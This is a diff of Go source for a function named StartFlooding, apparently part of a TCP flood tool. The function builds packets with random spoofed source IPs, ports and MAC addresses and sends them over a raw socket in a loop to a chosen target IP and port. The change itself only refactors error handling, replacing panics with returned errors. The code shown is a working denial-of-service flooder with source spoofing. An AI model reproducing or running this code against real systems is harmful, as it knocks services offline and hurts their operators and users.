@@ -24,10 +24,15 @@ func init() {
 }
 
 // StartFlooding does the heavy lifting, starts the flood
-func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
+func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
+	var (
+		ipHeader   *ipv4.Header
+		packetConn net.PacketConn
+		rawConn    *ipv4.RawConn
+	)
+
 	defer func() {
-		err = logger.Sync()
-		if err != nil {
+		if err := logger.Sync(); err != nil {
 			panic(err)
 		}
 	}()
@@ -51,11 +56,8 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 
 		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
 		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], dstPort)
-		ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
-
-		err := tcpPacket.SetNetworkLayerForChecksum(ipPacket)
-		if err != nil {
-			panic(err)
+		if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
+			return err
 		}
 
 		// Serialize.  Note:  we only serialize the TCP layer, because the
@@ -69,35 +71,31 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 		}
 
 		if err = ipPacket.SerializeTo(ipHeaderBuf, opts); err != nil {
-			panic(err)
+			return err
 		}
 
-		ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
-		if err != nil {
-			panic(err)
+		if ipHeader, err = ipv4.ParseHeader(ipHeaderBuf.Bytes()); err != nil {
+			return err
 		}
 
+		ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
 		tcpPayloadBuf := gopacket.NewSerializeBuffer()
 		payload := gopacket.Payload(payload)
-
 		if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, payload); err != nil {
-			panic(err)
+			return err
 		}
 
 		// XXX send packet
-		var packetConn net.PacketConn
-		var rawConn *ipv4.RawConn
-
 		if packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0"); err != nil {
-			panic(err)
+			return err
 		}
 
 		if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
-			panic(err)
+			return err
 		}
 
 		if err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
-			panic(err)
+			return err
 		}
 
 		logger.Info("packet sent!", zap.String("srcPort", tcpPacket.SrcPort.String()),
@@ -107,7 +105,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 			zap.String("dstIp", ipPacket.DstIP.String()))
 
 		if err = bar.Add(payloadLength); err != nil {
-			panic(err)
+			return err
 		}
 	}
 }
